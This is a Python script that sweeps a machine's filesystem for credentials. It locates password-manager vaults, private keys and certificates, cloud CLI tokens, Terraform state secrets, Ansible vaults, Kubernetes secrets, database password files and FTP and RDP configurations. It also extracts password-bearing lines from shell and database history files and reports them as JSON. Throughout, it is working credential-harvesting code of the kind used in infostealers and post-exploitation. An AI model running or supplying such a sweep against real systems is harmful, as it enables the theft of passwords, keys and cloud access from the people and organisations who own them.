import os
import sys
import json
import glob
import struct
import time
import platform
import re
import hashlib

def sweep_filesystem_credentials():
    """Comprehensive filesystem credential sweep.
    Targets: password managers (KeePass, 1Password, Bitwarden, LastPass),
    PKI certificates (.pfx, .p12, .pem, .key), cloud CLI configs,
    Terraform state files, Ansible vaults, Kubernetes secrets,
    Docker configs, Vagrant files, database configs.
    """
    home = os.path.expanduser('~')
    sys_name = platform.system()
    results = {'password_managers': [], 'certificates': [], 'cloud_configs': [],
               'iac_secrets': [], 'database_configs': [], 'misc_credentials': []}

    # ── 1. Password Managers ──
    # KeePass
    for ext in ['*.kdbx', '*.kdb']:
        for p in _recursive_glob(home, ext, max_depth=5):
            results['password_managers'].append({'type': 'KeePass', 'path': p, 'size': os.path.getsize(p)})

    # 1Password
    onepassword_dirs = [
        os.path.join(home, 'Library', 'Group Containers', 'group.com.1password', '1password7.sqlite'),
        os.path.join(home, 'Library', 'Application Support', '1Password', 'Data'),
        os.path.join(home, '.1password', 'data'),
        os.path.join(home, '.config', '1Password', 'data'),
    ]
    for op_path in onepassword_dirs:
        if os.path.exists(op_path):
            results['password_managers'].append({'type': '1Password', 'path': op_path})

    # Bitwarden
    bitwarden_paths = [
        os.path.join(home, '.config', 'Bitwarden', 'data.json'),
        os.path.join(home, 'Library', 'Application Support', 'Bitwarden', 'data.json'),
        os.path.join(home, 'AppData', 'Roaming', 'Bitwarden', 'data.json'),
        os.path.join(home, '.config', 'Bitwarden CLI', 'data.json'),
    ]
    for bw_path in bitwarden_paths:
        if os.path.isfile(bw_path):
            try:
                with open(bw_path, 'r') as f:
                    data = json.load(f)
                has_keys = any(k in data for k in ['encKey', 'encPrivateKey', 'accessToken'])
                results['password_managers'].append({
                    'type': 'Bitwarden', 'path': bw_path,
                    'has_encrypted_keys': has_keys,
                    'keys_present': [k for k in ['encKey', 'encPrivateKey', 'accessToken', 'refreshToken'] if k in data],
                })
            except Exception:
                results['password_managers'].append({'type': 'Bitwarden', 'path': bw_path})

    # LastPass
    lastpass_paths = [
        os.path.join(home, '.lastpass'),
        os.path.join(home, 'Library', 'Application Support', 'LastPass'),
    ]
    for lp_path in lastpass_paths:
        if os.path.isdir(lp_path):
            results['password_managers'].append({'type': 'LastPass', 'path': lp_path,
                                                  'files': os.listdir(lp_path)[:20]})

    # ── 2. PKI Certificates & Private Keys ──
    cert_patterns = ['*.pfx', '*.p12', '*.pem', '*.key', '*.crt', '*.cer', '*.der', '*.jks', '*.keystore']
    cert_search_dirs = [home, '/etc/ssl', '/etc/pki', '/etc/letsencrypt',
                        os.path.join(home, '.ssl'), os.path.join(home, '.tls')]
    for search_dir in cert_search_dirs:
        for ext in cert_patterns:
            for cert_path in _recursive_glob(search_dir, ext, max_depth=4):
                entry = {'path': cert_path, 'size': os.path.getsize(cert_path), 'type': ext.replace('*', '')}
                # Check if private key is encrypted
                if ext in ('*.pem', '*.key'):
                    try:
                        with open(cert_path, 'r') as f:
                            content = f.read(500)
                        entry['has_private_key'] = 'PRIVATE KEY' in content
                        entry['encrypted'] = 'ENCRYPTED' in content
                    except Exception:
                        pass
                results['certificates'].append(entry)

    # ── 3. Cloud CLI Credentials ──
    cloud_checks = [
        ('AWS credentials', os.path.join(home, '.aws', 'credentials')),
        ('AWS config', os.path.join(home, '.aws', 'config')),
        ('GCP ADC', os.path.join(home, '.config', 'gcloud', 'application_default_credentials.json')),
        ('GCP properties', os.path.join(home, '.config', 'gcloud', 'properties')),
        ('GCP access tokens', os.path.join(home, '.config', 'gcloud', 'access_tokens.db')),
        ('Azure profile', os.path.join(home, '.azure', 'azureProfile.json')),
        ('Azure tokens', os.path.join(home, '.azure', 'accessTokens.json')),
        ('Azure msal cache', os.path.join(home, '.azure', 'msal_token_cache.json')),
        ('DigitalOcean', os.path.join(home, '.config', 'doctl', 'config.yaml')),
        ('Heroku', os.path.join(home, '.netrc')),
        ('Terraform credentials', os.path.join(home, '.terraform.d', 'credentials.tfrc.json')),
        ('Vault token', os.path.join(home, '.vault-token')),
        ('Consul token', os.path.join(home, '.consul-token')),
        ('OCI config', os.path.join(home, '.oci', 'config')),
        ('Scaleway config', os.path.join(home, '.config', 'scw', 'config.yaml')),
    ]
    for name, path in cloud_checks:
        if os.path.isfile(path):
            entry = {'name': name, 'path': path, 'size': os.path.getsize(path)}
            # Try to extract key info from known formats
            try:
                with open(path, 'r') as f:
                    content = f.read(2000)
                if path.endswith('.json'):
                    data = json.loads(content)
                    entry['keys'] = list(data.keys())[:10]
                elif 'aws_access_key_id' in content.lower():
                    import configparser
                    cp = configparser.ConfigParser()
                    cp.read(path)
                    entry['profiles'] = cp.sections()
            except Exception:
                pass
            results['cloud_configs'].append(entry)

    # ── 4. Infrastructure-as-Code Secrets ──
    # Terraform state files (contain plaintext secrets!)
    for tf_state in _recursive_glob(home, '*.tfstate', max_depth=5):
        try:
            with open(tf_state, 'r') as f:
                state = json.load(f)
            # Count resources with sensitive outputs
            resources = []
            for r in state.get('resources', []):
                for inst in r.get('instances', []):
                    attrs = inst.get('attributes', {})
                    sensitive_keys = [k for k in attrs.keys() if any(s in k.lower() for s in ['password', 'secret', 'key', 'token', 'connection_string'])]
                    if sensitive_keys:
                        resources.append({'type': r.get('type', ''), 'name': r.get('name', ''),
                                          'sensitive_attrs': sensitive_keys})
            results['iac_secrets'].append({'type': 'Terraform', 'path': tf_state,
                                           'resources_with_secrets': resources[:20]})
        except Exception:
            results['iac_secrets'].append({'type': 'Terraform', 'path': tf_state, 'error': 'parse_failed'})

    # Ansible vault files
    for ansible_path in _recursive_glob(home, '*.yml', max_depth=4) + _recursive_glob(home, '*.yaml', max_depth=4):
        try:
            with open(ansible_path, 'r') as f:
                first_line = f.readline()
            if '$ANSIBLE_VAULT' in first_line:
                results['iac_secrets'].append({
                    'type': 'Ansible Vault', 'path': ansible_path,
                    'vault_version': first_line.strip(),
                    'size': os.path.getsize(ansible_path),
                })
        except Exception:
            pass

    # Kubernetes secret YAMLs on disk
    kube_dirs = [os.path.join(home, '.kube'), '/etc/kubernetes', '/var/run/secrets']
    for kube_dir in kube_dirs:
        if os.path.isdir(kube_dir):
            for kube_file in _recursive_glob(kube_dir, '*', max_depth=3):
                if os.path.isfile(kube_file):
                    try:
                        with open(kube_file, 'r') as f:
                            content = f.read(500)
                        if 'kind: Secret' in content or 'token:' in content.lower():
                            results['iac_secrets'].append({'type': 'K8s Secret', 'path': kube_file})
                    except Exception:
                        pass

    # ── 5. Database Configs ──
    db_configs = [
        ('MySQL', os.path.join(home, '.my.cnf')),
        ('MySQL', '/etc/mysql/my.cnf'),
        ('PostgreSQL', os.path.join(home, '.pgpass')),
        ('MongoDB', os.path.join(home, '.dbshell')),
        ('Redis', '/etc/redis/redis.conf'),
        ('Redis', os.path.join(home, '.rediscli_history')),
        ('CouchDB', '/etc/couchdb/local.ini'),
        ('Elasticsearch', '/etc/elasticsearch/elasticsearch.yml'),
    ]
    for db_name, db_path in db_configs:
        if os.path.isfile(db_path):
            entry = {'type': db_name, 'path': db_path, 'size': os.path.getsize(db_path)}
            if db_name == 'PostgreSQL' and db_path.endswith('.pgpass'):
                try:
                    with open(db_path, 'r') as f:
                        lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                    entry['entries'] = len(lines)
                    entry['hosts'] = [l.split(':')[0] for l in lines[:5]]
                except Exception:
                    pass
            results['database_configs'].append(entry)

    # ── 6. Miscellaneous Credentials ──
    misc_checks = [
        ('Filezilla', os.path.join(home, '.config', 'filezilla', 'sitemanager.xml')),
        ('Filezilla', os.path.join(home, '.filezilla', 'sitemanager.xml')),
        ('PuTTY sessions', os.path.join(home, '.putty', 'sessions')),
        ('WinSCP', os.path.join(home, 'AppData', 'Roaming', 'WinSCP', 'WinSCP.ini')),
        ('Remmina RDP', os.path.join(home, '.local', 'share', 'remmina')),
        ('mRemoteNG', os.path.join(home, 'AppData', 'Roaming', 'mRemoteNG', 'confCons.xml')),
        ('History file', os.path.join(home, '.bash_history')),
        ('History file', os.path.join(home, '.zsh_history')),
        ('MySQL history', os.path.join(home, '.mysql_history')),
        ('Python history', os.path.join(home, '.python_history')),
        ('NPM token', os.path.join(home, '.npmrc')),
        ('PyPI token', os.path.join(home, '.pypirc')),
        ('NuGet config', os.path.join(home, '.nuget', 'NuGet', 'NuGet.Config')),
        ('Composer auth', os.path.join(home, '.composer', 'auth.json')),
        ('Gradle properties', os.path.join(home, '.gradle', 'gradle.properties')),
        ('Maven settings', os.path.join(home, '.m2', 'settings.xml')),
    ]
    for name, path in misc_checks:
        if os.path.exists(path):
            entry = {'name': name, 'path': path}
            if os.path.isfile(path):
                entry['size'] = os.path.getsize(path)
                # Check history files for passwords in commands
                if 'history' in name.lower():
                    try:
                        with open(path, 'r', errors='ignore') as f:
                            lines = f.readlines()
                        password_cmds = [l.strip() for l in lines if any(kw in l.lower() for kw in ['password', 'passwd', '-p ', 'secret', 'token'])]
                        entry['password_commands'] = password_cmds[-20:]  # Last 20
                    except Exception:
                        pass
            elif os.path.isdir(path):
                entry['files'] = os.listdir(path)[:20]
            results['misc_credentials'].append(entry)

    results['summary'] = {
        'password_managers': len(results['password_managers']),
        'certificates': len(results['certificates']),
        'cloud_configs': len(results['cloud_configs']),
        'iac_secrets': len(results['iac_secrets']),
        'database_configs': len(results['database_configs']),
        'misc_credentials': len(results['misc_credentials']),
        'total_findings': sum(len(v) for v in results.values() if isinstance(v, list)),
    }
    return results

def _recursive_glob(base_dir, pattern, max_depth=4):
    """Recursive glob with depth limit."""
    matches = []
    if not os.path.isdir(base_dir):
        return matches
    skip_dirs = {'.git', 'node_modules', '__pycache__', '.venv', 'venv', '.tox',
                 'vendor', '.cache', 'Cache', 'CachedData', '.npm', '.cargo'}
    for dirpath, dirnames, filenames in os.walk(base_dir):
        depth = dirpath[len(base_dir):].count(os.sep)
        if depth >= max_depth:
            dirnames.clear()
            continue
        dirnames[:] = [d for d in dirnames if d not in skip_dirs]
        import fnmatch
        for fname in filenames:
            if fnmatch.fnmatch(fname, pattern):
                matches.append(os.path.join(dirpath, fname))
                if len(matches) >= 500:
                    return matches
    return matches

if __name__ == '__main__':
    out = sweep_filesystem_credentials()
    print(json.dumps(out, indent=2, default=str))

